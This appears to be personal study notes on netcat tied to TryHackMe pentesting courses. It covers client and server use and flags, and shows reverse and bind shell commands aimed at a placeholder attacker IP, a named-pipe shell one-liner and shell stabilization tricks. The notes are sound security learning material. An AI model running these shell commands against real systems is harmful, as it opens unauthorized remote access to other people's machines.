# Using “netcat”

## Start a Client

```bash
nc $HOST $PORT
```

Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like the following will establish a reverse shell:

```bash
nc -e /bin/bash $HOST $PORT
```

## Start a Server

```bash
nc -l -p $PORT $HOST
```

The $HOST specification here is optional; if left off, nc binds to 0.0.0.0.

Note that nc will exit once the first connection closes.

(According to the nc docs, it looks like `nc -l $HOST $PORT` should also work, but it doesn’t. I think — though I haven’t been able to verify — that what’s happening here is that `-p` specifies the port to *listen* to, while the port following the $HOST specification is the port to *connect* to.)

## Useful Flags

* `-l` — listen for incoming connections (rather than make an outgoing connection)
* `-v` — verbose
* `-n` — skip DNS resolution (slightly faster, less noisy on the network)
* `-p` specify the port to listen to
* `-u` connect using UDP instead of TCP

## Example Attack Patterns

Example reverse shell:

* Attacker: `nc -lvnp $LISTENER_PORT`
* Target: `nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash`

Example bind shell:

* Attacker: `nc $TARGET_IP $LISTENER_PORT`
* Target: `nc -lvnp $LISTENER_PORT -e /bin/bash`

These are almost, but not quite, mirror images of each other.

The `-e` switch isn’t available on many UNIX-like OSes. Working around this leads to the common named pipe pattern:

```bash
mkfifo /tmp/p; nc -lvnp $LISTENER_PORT < /tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p
```

(Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See [the discussion of msfvenom payloads](metasploit.md) for a detailed breakdown of this pattern.)

Initial netcat reverse shells (in particular web shells) are non-interactive.

### Shell “Stabilization”

Shell “stabilization” refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.

A common method of stabilizing netcat shells is to use Python:

* Start an instance of bash connected to an actual PTY: `env TERM=xterm python -c 'import pty; pty.spawn("/bin/bash")'`
* Suspend the reverse shell.
* Use `stty raw -echo; fg` to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.

Note that the `stty` command can be canceled using `reset` (after closing the reverse shell). Since echo is turned off, typing this won't be visible. Trust the force!

You can *mostly* bypass the need for the `stty` command by using `rlwrap`, which sets all of this up for you (though it doesn’t redirect control sequences, so Ctrl+C will still kill the connection).

Or, just fire up [socat](socat.md) from inside of netcat!

NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.

## References

* [TryHackMe - Complete Beginner](tryhackme-complete-beginner.md)
* [TryHackMe - CC - Pen Testing](tryhackme-cc-pen-testing.md)
* [TryHackMe - Exploiting Log4j](tryhackme-exploiting-log4j.md)

- - - -

👤 Nathan Acks